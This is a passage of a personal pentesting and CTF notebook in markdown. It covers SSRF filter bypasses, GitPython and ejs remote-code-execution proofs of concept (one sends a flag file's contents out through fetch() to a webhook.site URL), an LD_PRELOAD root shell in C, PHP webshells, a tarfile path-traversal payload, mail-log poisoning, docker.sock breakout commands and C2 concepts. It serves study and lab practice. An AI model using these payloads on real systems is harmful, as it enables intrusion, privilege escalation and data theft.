- [Pentesting Team City](https://exploit-notes.hdks.org/exploit/web/teamcity-pentesting/)

------------------------------

### Pentesting Rsync

- Use rsync to interact with the service
- `rsync <hosst>::` to check for directories

![image](https://github.com/user-attachments/assets/2a23f845-a1d8-4c51-aba7-f2d63942847f)

- Then, `rysnc rsync://[username]@[ip]/directory/` to list sub directories or files

![image](https://github.com/user-attachments/assets/de21cc57-25d9-4485-a3fa-dc8959254e4b)

- Use the -a option to upload file

![image](https://github.com/user-attachments/assets/42ce6eab-4e4a-4d83-afbe-2b54a425422a)

- To copy files, use the -avh option 

      rsync -avh rsync://rsync-connect@10.10.121.4/files/sys-internal/.ssh/ [directory you want to copy to]

![image](https://github.com/user-attachments/assets/c5585930-4fea-422e-a72c-7226460db2df)

----------------------------

### Bypassing restricted port number on firefox

- Type `about:config` in the url bar

![image](https://github.com/user-attachments/assets/32cb156d-8016-47a5-bfb4-332630c4463e)

- Copy `network.security.ports.banned.override`,pick string, delete if it contains `boolean` type

![image](https://github.com/user-attachments/assets/4dc0fdc7-a2a0-4194-8239-807fe0156253)

- You can specify a port range

![image](https://github.com/user-attachments/assets/b273f8c9-aee2-4c4b-bb9f-68cb7b6b7fb9)

-----------------------------

### REFERENCES:

- [Special Agent's blog](https://www.specialagentsqueaky.com/blog-post/r5iwj96j/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/)
  
-------------------------------

### Server Side Request Forgery Little Cheatsheet [Portswigger]

- It is a server side web vulnerability that allows an attacker to induce a server to make requests to an unintended location.In other words, the attacker may be allowed to connect to internal services within organization infrastructures.

### SSRF attacks against the server

- An attacker can cause the server to make a request to itself via the loopback network interface.It involves providing a url like `localhost` or `127.0.0.1`.For example,modifying an endpoint POST `parameter` that loads a url

      POST /product/stock HTTP/1.0
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 118
      
      stockApi=http://localhost/admin

- Exploiting it

![image](https://github.com/user-attachments/assets/5fc18d8f-4dd5-4e7a-975b-7c88e6bb6bbb)


### SSRF against other back end systems

- Most times , some servers have `non-routable private ip addresses` which are reserved for private use and cannot be accessed on the internet.In many cases,internal backend functionalities always have sensitive info with no authentication.SSRF allows an attacker to scan the whole network for internal services.
- Fuzz with `burp intruder` and spot juicy requests based on the `Content-Length`

![image](https://github.com/user-attachments/assets/916abeda-3030-42d6-b908-645d9e7478ed)

- Admin panel spotted on `192.168.0.7`

  ![image](https://github.com/user-attachments/assets/38897cad-609e-4c4a-866c-b5f2b7e375f3)

-----------------

### Circumventing Common SSRF defenses

- Bypassing blacklist for `localhost` and `127.0.0.1`
  - Try alternative representation:```2130706433,017700000001 or 127.1```
  - Register a domain that resolves to `localhost` e.g with burp collaborator
  - Use url-decoding or case variation
  - Or use open-redirect to redirect to localhost
  - Or switch to `http://` or `http://`

-  Exploiting it

![image](https://github.com/user-attachments/assets/e35b87e8-4a9d-4863-854e-253c72378465)

--------------------

### Exploiting Whitelist based-filters

-------------------

- You can embed credentials in a URL before the hostname, using the @ character. For example:

`https://expected-host:fakepassword@evil-host`

- You can use the # character to indicate a URL fragment. For example:

`https://evil-host#expected-host`

- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:

`https://expected-host.evil-host`

- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.

- You can use a combo of everything

### Abusing SSRF with open-redirect

- Payload

![image](https://github.com/user-attachments/assets/7810de80-c231-4e82-8212-0e080bf4aa6d)


---------------------

### Dumping .git sensitive info

- Use [GitTools](https://github.com/internetwache/GitTools)'s `Extractor/extractor.sh` to dump sensitive info

![image](https://github.com/user-attachments/assets/a4ea7cfd-378f-4f3e-b725-67be8be9ae11)

- Objects spotted

![image](https://github.com/user-attachments/assets/520e4b68-2b84-4569-8058-92bda7c2101b)

----------------------

### Exploiting clone_from() Gitpython function

- Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments. This is only relevant when enabling the ext transport protocol.

- POC
  
      from git import Repo
      r = Repo.init('', bare=True)
      r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])

- A good method to exploit it to create a script and run the script with the `ext::sh`.e.g

![image](https://github.com/user-attachments/assets/63fe448c-d9ce-4dc1-8b0b-cfe73041b2f9)

- Shadow file result

![image](https://github.com/user-attachments/assets/242797a1-e1fe-4bb0-bd93-c90a0c48455f)

- Payload-:```ext::bash -c [path_to your_malicious_binary]% ls2```

------------------------

### Reference:

- [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

-------------------------

### Node's ejs Prototype Pollution CVE

The poc below bypasses the fix for `CVE-2022-29078` in `^3.1.7`

- Example of vulnerable `index.js`, res.render in this case is controllable

      const express = require('express')
      const app = express()
      const port = 3000
      
      app.set('view engine', 'ejs');
      
      app.get('/page', (req,res) => {
          res.render('page', req.query);
      })
      
      app.listen(port, () => {
        console.log("Example app listening on port ${port}")
      })

- POC code: `This poc below works well with `^3.1.7`

      http://127.0.0.1:3000/page?settings[view%20options][closeDelimiter]=1")%3bprocess.mainModule.require('child_process').execSync('calc')%3b//

- Another POC code with [escapeFunction]

      http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');

- Poc for out-of-band exfiltration
  
      http://127.0.0.1:3000/?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20fetch(`https://webhook.site/fb92548e-56b3-4f02-9ca7-2b702be8f227?flag=${process.mainModule.require('child_process').execSync('cat%20flag-aaee2b1430.txt').toString()}`);//

### Testing on version `^3.1.9` in PatriotCtf with the above POC

- Oops,we have RCE

![image](https://github.com/user-attachments/assets/de683e16-2030-41b1-9e10-28bbfb267607)


---------------------

### REFERENCES:

- [Github](https://gist.github.com/ky28059/d539294051afa549eb303b832c7a5826)
- [Github](https://github.com/mde/ejs/issues/720)

--------------------

### Php escapes for `escapeshellcmd() and escapeshellargs()`

- [kacperszurek](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)

---------------------

### Using Flask_unsign as a module in python's code

--------------------

### Importing it

- Use

`import flask_unsign`

![image](https://github.com/user-attachments/assets/3da2de37-3aa8-4512-99e4-7e425c465b2f)

### Signing cookies

- Use the `sign()` object which requires 2 arguments a dict  containing a value and a string containig the secret key.

![image](https://github.com/user-attachments/assets/e3298eab-c958-4190-a4ec-cde63648eccb)

### Decoding Cookies

- Use the `decode()` object to casually decode the session, it requires only one argument which is the cookie

![image](https://github.com/user-attachments/assets/9bee3729-b68d-4354-9cd0-c4373f9cf2e2)

### Verifying Cookies

- Use the `verify()` method which requires a cookie argument in string type,it returns a boolean.

![image](https://github.com/user-attachments/assets/155a8934-d235-4929-9010-d4fd68a7c883)

### Cracking cookies

- The module responsible is the `flask_unsign.cracker`

`from flask_unsign.cracker import *`

- Call a function `Cracker`, pass the cookie as an argument and finally assign the object to a variable

![image](https://github.com/user-attachments/assets/1f389464-b095-46ea-be38-38fd3c391c38)

- You need to set everything to quiet,with the `object().quiet` variable.By default,it is set to bool `False`,we need to set it to `True` because the non-quiet mode can be weird.

![image](https://github.com/user-attachments/assets/593a81b0-9a7c-4eeb-80e5-8c9881dae051)

- Finally,call the `crack` function and pass in a list of words that you want to bruteforce with.

![image](https://github.com/user-attachments/assets/33d66d65-98f6-461b-bdd6-8479f556275c)

- After successfully bruteforcing the cookie,the secret is set to variable `object().secret`

![image](https://github.com/user-attachments/assets/2a71ec5f-1c8d-42f9-afd4-d35c124e6289)

------------------

### Exploiting ast.parse() in python with keyword `mode` set to `eval` or not

- Payload-:```ast.parse(len(__import__('subprocess').Popen('ls').communicate()))```

![image](https://github.com/user-attachments/assets/9144d74b-f144-43a7-8a85-8c30a82fbeb2)

------------------

### REFERENCES-:

- [Twosix](https://twosixtech.com/blog/hijacking-the-ast-to-safely-handle-untrusted-python/)

------------------

### Exploiting SSRF with redirect

- See the code below,change the host keyword to your ip

```python3
#! /usr/bin/env python3
from flask import Flask, redirect,request
from urllib.parse import quote
app = Flask(__name__)    

@app.route('/',methods=['GET'])    
def root():
    port = request.args.get("port")
    file = request.args.get("file")
    if file != None:
        url =  f"http://127.0.0.1:{port}/{file}"
    else:
        url = f"http://127.0.0.1:{port}/"
    return redirect(url, code=301)
    
if __name__ == "__main__":
    app.run(host="10.9.1.30", port=8080)
```

  - Proof with THM's room `Londonbridge`,I passed in `&` in a url encoded format.This approach helps you bypass filtered strings like `localhost`,`127.0.0.1`,`0.0.0.0`.


![image](https://github.com/user-attachments/assets/145bb5e4-2778-46a9-8393-a84c993245cb)
  
----------------------

### ABUSING LD_PRELOAD

- A sample

![image](https://github.com/user-attachments/assets/5353735b-464b-4c3e-a03b-a3e553f3205f)

- Save this code as `shell.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#define _GNU_SOURCE
void _init() 
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- Compile and run based on the sudo binary, in my case,it was `ping`.

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami
```

- Result

![image](https://github.com/user-attachments/assets/a725c60e-a430-4e05-8683-e2f98204eaff)


------------------

### Xfreerdp error:

![image](https://github.com/user-attachments/assets/917ff8b7-50d8-4a0f-b442-34737f6f93db)

- Fix-: Remmina

![image](https://github.com/user-attachments/assets/53fc3a51-1ce9-40e5-94fe-fdfa5f3ae062)

- In the case of Remmina, set the `TLS` level to `0` in the case of Windows 7 rdp as seen in the image above.

------------------

### CRIME PROBLEM with zlib compression-:

- Challenge Code-:

```python3
import os
import json
import zlib

def lambda_handler(event, context):
    try:
        payload=bytes.fromhex(event["queryStringParameters"]["payload"])
        flag = os.environ["flag"].encode()
        message = b"Your payload is: %b\nThe flag is: %b" % (payload, flag)
        compressed_length = len(zlib.compress(message,9))
    except ValueError as e:
        return {'statusCode': 500, "error": str(e)}

    return {
        'statusCode': 200,
        'body': json.dumps({"sniffed": compressed_length})
    }
```

- Solve

```python3

#!/usr/bin/env python3
import requests
import json

base_url = 'https://55nlig2es7hyrhvzcxzboyp4xe0nzjrc.lambda-url.us-east-1.on.aws/?payload='

flag = 'udctf{'
while True:
    for code in range(33, 127):
        print('[+] Try flag:', flag + chr(code))
        url = base_url + (flag + chr(code)).encode().hex()
        r = requests.get(url)
        res = json.loads(r.text)
        size = res['sniffed']
        if size == 67:
            flag += chr(code)
            break
    if flag[-1] == '}':
        break

print('[*] flag:', flag)
```

----------------

### References-:

- [Yocchin](https://yocchin.hatenablog.com/entry/2024/11/12/084437)

----------------

### Writing hash in /etc/passwd format

- Example

```rootzy:$1$sJ7Zcpwb$fKpiAes0t0ocZAHeUzn6x1:0:0:root:/root:/bin/bash```

-----------------

### Using scp

- Window files-:
  ` scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db . `

-----------------

### Creating malicious tar.gz to exploit tarfile.extractall()

------------------

- Function `tarfile.extractall()` is vulnerable to path traversal which can be used to overwrite files.
- Code-:

```python3
#! /usr/bin/env python3
import tarfile
import io

tar = tarfile.TarFile.open('malicious.tar.gz', 'w:gz')

info = tarfile.TarInfo("../../var/www/html/databases/shell.php")
info.mode=0o444 # So it cannot be overwritten
php_shell = b"<?php echo system($_GET['cmd']); ?>"
info.size=len(php_shell)
tar.addfile(info,io.BytesIO(php_shell))
tar.close()
```
----------------

### REFERENCE-:

- [Mindsdb](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-2g5w-29q9-w6hx)

---------------

### LFI2RCE with /var/log/mail.log

- If you can read port `25` which is `smtp` log `/var/log/mail.log` via Local File Include.The payload below is url-encoded.

![image](https://github.com/user-attachments/assets/257a535c-afcf-417b-bdb2-89cfb70550d5)

- Then, connect to the port and use the details below.

```bash
telnet <ip> 25
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>
```

![image](https://github.com/user-attachments/assets/3224f7ca-ac7e-4a6d-9a31-75575ac98ffd)

- RCE-:

![image](https://github.com/user-attachments/assets/70db8db3-5811-4074-bc70-e8a89b69d31e)

--------------

### Fixing git --auto update alias and gau clash

- Error-:

![image](https://github.com/user-attachments/assets/ec0cf078-bb76-4f06-80bf-b3f80852eb49)

- Rename gau

```
▻ tar xvf gau-linux-amd64.tar
▻ mv gau-linux-amd64 /usr/bin/getallurls
```
- You can get the tar files from [releases](https://github.com/lc/gau/releases)
- Or just remove the alias from `git.plugin.zsh`.Filepath is `~/.oh-my-zsh/plugins/git/git.plugin.zsh`.The alias conflicts with gau.

--------------

### PHP POST parameter webshell

- Code-:

```php
<?php

if (isset($_POST['username'])) {
  echo system($_POST['username']);
}else {
    echo "No username provided";
}
?>
```

- Don't forget to set `Content-Type` to `application/x-www-form-urlencoded`

![image](https://github.com/user-attachments/assets/152b8515-3a83-41bd-a356-306eef7f4e2e)

--------------------

### C2 Frameworks [Command and Control]

- C2s help to manage compromised hosts during an engagement and makes it easy for laterla movement.AC2 framework is like a netcat listener (C2 server) capable of handling multiple reverse shells (C2 agents).It is like a server but for reverse shells but unlike almost all C2 frameworks, a C2 requires a special payload generator e.g metasploit uses the msfvenom payload generator.One can perceive a C2 as netcat with session management.

 ### Structure-:

- C2 server serves as a hub for the agent to call back to.Agents will reach back and wait for the C2 operator's command.
- An agent is a program generated by the C2 framework that calls back to a listener on a C2 server. Most of the time, this agent enables special functionality compared to a standard reverse shell. Most C2 Frameworks implement pseudo commands to make the C2 Operator’s life easier. Some examples of this may be a pseudo command to Download or Upload a file onto the system. It’s important to know that agents can be highly configurable, with adjustments on the timing of how often C2 Agents beacon out to a Listener on a C2 Server and much more.
- Listener is an application running on the C2 server that waits for a callback over a specific port or protocol. Some examples of this are DNS, HTTP, and or HTTPS.
- A Beacon is the process of a C2 Agent calling back to the listener running on a C2 Server.

### Payload types-:

- Stageless payload-:Stageless Payloads are the simplest of the two; they contain the full C2 agent and will call back to the C2 server and begin beaconing immediately.
- Staged payloads require a callback to the C2 server to download additional parts of the C2 agent. This is commonly referred to as a “Dropper” because it is “Dropped” onto the victim machine to download the second stage of our staged payload. This is a preferred method over stageless payloads because a small amount of code needs to be written to retrieve the additional parts of the C2 agent from the C2 server. It also makes it easier to obfuscate code to bypass Anti-Virus programs.The steps are outlined below-:
  - The Victim downloads and executes the Dropper
  - The Dropper calls back to the C2 Server for Stage 2
  - The C2 Server sends Stage 2 back to the Victim Workstation
  - Stage 2 is loaded into memory on the Victim Workstation
  - C2 Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on the C2 Server.

### PAYLOAD FORMATS-:

- PowerShell Scripts -:Which may contain C# Code and may be compiled and executed with the Add-Type commandlet
- HTA Files
- JScript Files
- Visual Basic Application/Scripts
- Microsoft Office Documents

### MODULES-:

- Modules are a core component of any C2 Framework; they add the ability to make agents and the C2 server more flexible. Depending on the C2 Framework, scripts must be written in different languages. Cobalt Strike has “Aggressor Scripts”, which are written in the “Aggressor Scripting Language”. PowerShell Empire has support for multiple languages, Metasploit’s Modules are written in Ruby, and many others are written in many other languages.
- Post-Exploitation modules for anything after initial compromise e.g running SharpHound.ps1 to find paths of lateral movement, or it could be as complex as dumping LSASS and parsing credentials in memory.
- Pivoting Modules-: ne of the last major components of a C2 Framework is its pivoting modules, making it easier to access restricted network segments within the C2 Framework. If you have Administrative Access on a system, you may be able to open up an “SMB Beacon”, which can enable a machine to act as a proxy via the SMB protocol. This may allow machines in a restricted network segment to communicate with your C2 server.

![image](https://github.com/user-attachments/assets/13f625ad-5652-4a94-93c5-5261aa15fd4f)

### Domain Fronting

- Domain Fronting utilizes a known, good host (for example) Cloudflare. Cloudflare runs a business that provides enhanced metrics on HTTP connection details as well as caching HTTP connection requests to save bandwidth.  Red Teamers can abuse this to make it appear that a workstation or server is communicating with a known, trusted IP Address. Geolocation results will show wherever the nearest Cloudflare server is, and the IP Address will show as ownership to Cloudflare.

![image](https://github.com/user-attachments/assets/ca9d82fb-4843-4180-a1bf-06c31080797a)

### C2 Profiles-:

- The next technique goes by several names by several different products, "NGINX Reverse Proxy", "Apache Mod_Proxy/Mod_Rewrite",  "Malleable HTTP C2 Profiles", and many others. However, they are all more or less the same. All of the Proxy features more or less allow a user to control specific elements of the incoming HTTP request. Let's say an incoming connection request has an "X-C2-Server" header; we could explicitly extract this header using the specific technology that is at your disposal (Reverse Proxy, Mod_Proxy/Rewrite, Malleable C2 Profile, etc.) and ensure that your C2 server responds with C2 based responses. Whereas if a normal user queried the HTTP Server, they might see a generic webpage. This is all dependent on your configuration.

![image](https://github.com/user-attachments/assets/8d052993-545e-45c3-9c55-2b2818901f16)


### C2 framework

- Free-:
  - Metasploit
  - Armitage
  - Powershell Empire/Starkiller
  - Covenant
  - Slither
  - [Testing C2s](https://howto.thec2matrix.com/)

### Setting up Armitage-:
- Steps-:

```bash
git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
bash package.sh
```

- Use Java 11 to build

![image](https://github.com/user-attachments/assets/5298f58b-361d-4d96-a568-95f8c168177c)

- Change directory to `armitage/release/unix` to see jar files

![image](https://github.com/user-attachments/assets/cbf00241-3470-4840-8233-4875641fcb47)

- Teamserver-: This is the file that will start the Armitage server that multiple users will be able to connect to. This file takes two arguments:
  - IP Address-: Your fellow Red Team Operators will use the IP Address to connect to your Armitage server.
  - Shared Password-: Your fellow Red Team Operators will use the Shared Password to access your Armitage server.

### Preparing the Environment

- Postgresql is required to initialize Armitage

![image](https://github.com/user-attachments/assets/5786e9ea-f6bd-4b58-8e65-bdc1334fc63f)

- You need to be root while trying to initialized msfdb

```bash
sudo msfdb delete
sudo msfdb init
```

![image](https://github.com/user-attachments/assets/681c5897-93a4-4ba7-944b-fd0bdbb3fb5c)

- Starting and connecting to Armitage

`sudo ./temaserver [ip] [password]`

![image](https://github.com/user-attachments/assets/7f7f4c0d-e2d8-4d61-bdc8-965e9ea3733b)


- I encountered this pretty interesting msfconsole memory corruption  error

```bash
❯ msfconsole
Metasploit tip: After running db_nmap, be sure to check out the result 
of hosts and services
double free or corruption (out)mework console...-
```
- I fixed with the steps below.[Source](https://github.com/rapid7/metasploit-framework/issues/18422)

```
sudo apt remove metasploit-framework
rm -rf ~/.msf4
sudo apt autoremove
sudo apt update
sudo apt install metasploit-framework
msfconsole
```
-

----------------

### TCPDUMP Basics-:

### Basic tcpdump packet capture-:

-  Specify an interface with `-i` to listen on it, you can specify with `any` or `<interface's name>` e.g eth0.To check for interfaces,use `ip address show` or `ip a s`.

![image](https://github.com/user-attachments/assets/608a2616-05b0-40a0-9473-cc9e68df0c3e)

- Save to files with option `-w`

![image](https://github.com/user-attachments/assets/ad1ed2fa-c2a7-494d-b7a4-8761fe0820b5)

- Read captured packets from a file with `-r`

![image](https://github.com/user-attachments/assets/0ca025c3-3ae2-495f-9944-c60a7e9fb15e)

- Limit the amount of captured packets with `-c` which means `count`

![image](https://github.com/user-attachments/assets/f2ff3a21-3fb6-4356-a3c5-b9e64410f009)


- If you don't want port or ips to be resolved,use `-n` and -v for verbosity,for more verbosity,use `-vv` and `-vvv`

### ADVANCED FILTERING

- Filter by host with the `host` option as seen below,you can also limit packets to a source ip or hostname and destination ip or hostname with `src host hostname`,`src host ip`,`dst host hostname` and `dst host ip`.

![image](https://github.com/user-attachments/assets/61e4b7e4-a4ce-412e-bcb5-4a60ddb72a3c)

- You can limit to ports,use `port` option or `dst port [port number]` and `src port [port number]`.

![image](https://github.com/user-attachments/assets/cd77f30d-0174-4af3-9018-3a081ee47201)

- Packets can also be filtered based on protocols e.g `ip,ip6,icmp,tcp and udp`.

### Logical operators

-  and: Captures packets where both conditions are true. For example, tcpdump host 1.1.1.1 and tcp captures tcp traffic with host 1.1.1.1.
-  or: Captures packets when either one of the conditions is true. For instance, tcpdump udp or icmp captures UDP or ICMP traffic.
- not: Captures packets when the condition is not true. For example, tcpdump not tcp captures all packets except TCP segments; we expect to find UDP, ICMP, and ARP packets among the results.

### ADVANCED FILTERING

- We can limit the displayed packets to those smaller or larger than a certain length e.g `greater <length>` or `less <length>`.
- Header Bytes
The purpose of this section is to be able to filter packets based on the contents of a header byte. Consider the following protocols: ARP, Ethernet, ICMP, IP, TCP, and UDP. These are just a few networking protocols we have studied. How can we tell Tcpdump to filter packets based on the contents of protocol header bytes? (We will not go into details about the headers of each protocol as this is beyond the scope of this room; instead, we will focus on TCP flags.)

- Using pcap-filter, Tcpdump allows you to refer to the contents of any byte in the header using the following syntax proto[expr:size], where:

    proto refers to the protocol. For example, arp, ether, icmp, ip, ip6, tcp, and udp refer to ARP, Ethernet, ICMP, IPv4, IPv6, TCP, and UDP respectively.
    expr indicates the byte offset, where 0 refers to the first byte.
    size indicates the number of bytes that interest us, which can be one, two, or four. It is optional and is one by default.

To better understand this, consider the following two examples from the pcap-filter manual page (and don’t worry if you find them difficult):

    ether[0] & 1 != 0 takes the first byte in the Ethernet header and the decimal number 1 (i.e., 0000 0001 in binary) and applies the & (the And binary operation). It will return true if the result is not equal to the number 0 (i.e., 0000 0000). The purpose of this filter is to show packets sent to a multicast address. A multicast Ethernet address is a particular address that identifies a group of devices intended to receive the same data.
    ip[0] & 0xf != 5 takes the first byte in the IP header and compares it with the hexadecimal number F (i.e., 0000 1111 in binary). It will return true if the result is not equal to the (decimal) number 5 (i.e., 0000 0101 in binary). The purpose of this filter is to catch all IP packets with options.



### Displaying Packets

- Commands
  
```
    -q: Quick output; print brief packet information
    -e: Print the link-level header
    -A: Show packet data in ASCII
    -xx: Show packet data in hexadecimal format, referred to as hex
    -X: Show packet headers and data in hex and ASCII
```

### ORACLE PADDING ATTACK with padbuster

- Syntax-: `padbuster http://10.10.31.207:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 16 -encoding 2`

- URL – This is the URL that you want to exploit, including query string if present. There are optional switches to supply POST data (-post) and Cookies if needed (-cookies)
    Encrypted Sample – This is the encrypted sample of ciphertext included in the request. This value must also be present in either the URL, post or cookie values and will be replaced automatically on every test request
    Block Size – Size of the block that the cipher is using. This will normally be either 8 or 16, so if you are not sure you can try both

For this example, we will also use the command switch to specify how the encrypted sample is encoded. By default PadBuster assumes that the sample is Base64 encoded, however in this example the encrypted text is encoded as an uppercase ASCII HEX string. The option for specifying encoding (-encoding) takes one of the following three possible values:

    0: Base64 (default)
    1: Lowercase HEX ASCII
    2: Uppercase HEX ASCII

- In the syntax provided above, the ciphertext is divided into 4 blocks which is why it is set to 16
- Results-:

![image](https://github.com/user-attachments/assets/2a45a581-5d84-4ef8-a893-73bc92fe73f9)

![image](https://github.com/user-attachments/assets/743ad518-fe15-407f-87ea-89237ef10f9b)

- You can also use padre which is faster than padbuster.Syntax-:

```bash
padre -u "http://10.10.88.80:8080/api/debug/$" -err "Decryption error" -e lhex "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4"
```

![image](https://github.com/user-attachments/assets/2876f594-ed40-4e99-a541-bc7a7307f10b)

------------

### REFERENCE-:

- [Aon's blog](https://www.aon.com/cyber-solutions/aon_cyber_labs/automated-padding-oracle-attacks-with-padbuster/)

-------------

### Exploting writable docker.sock to breakout of container

------------

- `Docker.sock` daemon which is used by docker to communicate with docker api.Use the find command `find / -name "docker.sock" -type f 2</dev/null` or it can spotted with `linpeas.sh`.

![image](https://github.com/user-attachments/assets/5481d2d4-6178-4b9e-a3a7-058814ad3994)

- Check if docker is running on the container,luckily for me,docker was running on this container.Exploiting it wiht docker will be easy

![image](https://github.com/user-attachments/assets/c7c0e776-dd84-49d8-acf1-a1289bd9e19c)

- Exploit with `docker run -v /:/host -it <image name>`,the exploitation process relies on spawning a container with the host file system mounted in it and the great plus is that we will be breaking out as root.he filesystem will be mounted in directory `/host`.

![image](https://github.com/user-attachments/assets/f4cd3f49-9b8d-4b20-8d03-e18029e48436)

### or Exploiting with curl and nc

- I used curl in this example,you can either communicate with docker api with http or as a file with `--unix-socket` option with curl.
- Run `dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375` to access via http
- Or use curl-:
```bash
curl -i -s --unix-socket /run/docker.sock http://localhost/containers/json
```

![image](https://github.com/user-attachments/assets/3ed1877e-2110-46a6-8f82-e256e17159e6)

- We will be replicating the docker api `run` command to create,start and attach a container.Don't forget to switch the json key `image` to the available one.You can check the dockerfile for an available image.Don't forget the id,it is required to check run the container.

```bash
curl -i -s --unix-socket /run/docker.sock -X POST http://localhost/containers/create \
-H "Content-Type: application/json" -d '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "openjdk:11","Volumes": {"/hostfs/": {}},"HostConfig": {"Binds": ["/:/hostfs"]}}'
```

![image](https://github.com/user-attachments/assets/0d90d4da-607b-440b-9c64-769d92e00175)

- Start the container

```bash
curl -i -s --unix-socket /run/docker.sock -X POST http://localhost/containers/<id>/start
```

![image](https://github.com/user-attachments/assets/43de9628-97b3-4317-bc6a-ba6ee73c7ec0)

- Attach the process

```bash
curl -i -s --unix-socket /run/docker.sock -X POST http://localhost/containers/09832b2e10c61ffd863fe4c8a50e07d820cd9150af7e3bfd6be7b7400c9f7c94/attach\?stream\=1\&stdin\=1\&stdout\=1\&stderr\=1
```

-------------

### REFERENCE-:

- [Owasp-Vitcc](https://medium.com/owasp-vitcc/docker-breakout-mounted-docker-socket-76cb77794158)

-------------

### RACE CONDITION CODE SNIPPETS [Turbo Intruder]

-------------

- Password-bruteforce-:

```python3
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    for word in open("C:\Users\HP\Documents\wordlist.txt"):
        engine.queue(target.req, word.rstrip(), gate='race1')
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

--------------

- [Hackingarticles](https://www.hackingarticles.in/burp-suite-for-pentester-turbo-intruder/)

--------------

### Understanding Graphql

--------------

- Graphql is a query language that allows effective communication between clients and servers.It allows a user to specify the amount of data that they need and prevents calling multiple objects.Clients make a query to a specific server and data is gotten from various places.
- Data in graphql can be manipulated in three ways.
  - Queries fetch data
  - Mutations add,change or remove data
  - Subscriptions are similar to queries, but set up a permanent connection by which a server can proactively push data to a client in the specified format.

---------------

### Graphql SCHEMA

---------------

- In GraphQL, the schema represents a contract between the frontend and backend of the service. It defines the data available as a series of types, using a human-readable schema definition language.The example below shows a simple schema definition for a Product type. The ! operator indicates that the field is non-nullable when called (that is, mandatory).

```graphql
type Product {
        id: ID!
        name: String!
        description: String!
        price: Int
    }
```

- Graphql queries retrieve data from the data store.They are roughly equivalent to the `GET` requests in the REST API.A query's component

- A query operation type. This is technically optional but encouraged, as it explicitly tells the server that the incoming request is a query.
- A query name. This can be anything you want. The query name is optional, but encouraged as it can help with debugging.
- A data structure. This is the data that the query should return.
- Optionally, one or more arguments. These are used to create queries that return details of a specific object (for example "give me the name and description of the product that has the ID 123").

```graphql
#Example query

    query myGetProductQuery {
        getProduct(id: 123) {
            name
            description
        }
    }
```

- Graphql api mutations are similar to `REST API`'s `POST`,`PUT` and `DELETE` methods.Mutations have a defuned structure for operation type, name and structure for the returned data.Mutations require a form of input of some type.This can be an inline value.

```graphql
#Example mutation request

    mutation {
        createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
            id
            name
            listed
        }
    }
```
- Response to the above code

```graphql
#Example mutation response

    {
        "data": {
            "createProduct": {
                "id": 123,
                "name": "Flamin' Cocktail Glasses",
                "listed": "yes"
            }
        }
    }
```

------------

### Components of fields and mutations

------------

- All Graphql types contain items of queryable data types called fields.The example belows shows a query for employees data and in this case the fields are `id`,`name.firstname` and `name.lastname`.

```graphql
 #Request

    query myGetEmployeeQuery {
        getEmployees {
            id
            name {
                firstname
                lastname
            }
        }
    }
```

```graphql
#Response

    {
        "data": {
            "getEmployees": [
                {
                    "id": 1,
                    "name" {
                        "firstname": "Carlos",
                        "lastname": "Montoya"
                    }
                },
                {
                    "id": 2,
                    "name" {
                        "firstname": "Peter",
                        "lastname": "Wiener"
                    }
                }
            ]
        }
    }
```

-------------

### Arguments

-------------

- Arguments are values provided to a field.Values acccepted are only types defined in a schema.When you send a query or mutation that contains arguments, the GraphQL server determines how to respond based on its configuration. For example, it might return a specific object rather than details of all objects.The query below sends argument's value for `id` and retrieves details based  on the fields.

```graphql

    #Example query with arguments

    query myGetEmployeeQuery {
        getEmployees(id:1) {
            name {
                firstname
                lastname
            }
        }
    }
```

```json

    {
        "data": {
            "getEmployees": [
            {
                "name" {
                    "firstname": Carlos,
                    "lastname": Montoya
                    }
                }
            ]
        }
    }
```

- If user-supplied arguments are used to access objects directly then a GraphQL API can be vulnerable to access control vulnerabilities such as insecure direct object references (IDOR).

------------

### Graphql queries with variable

------------

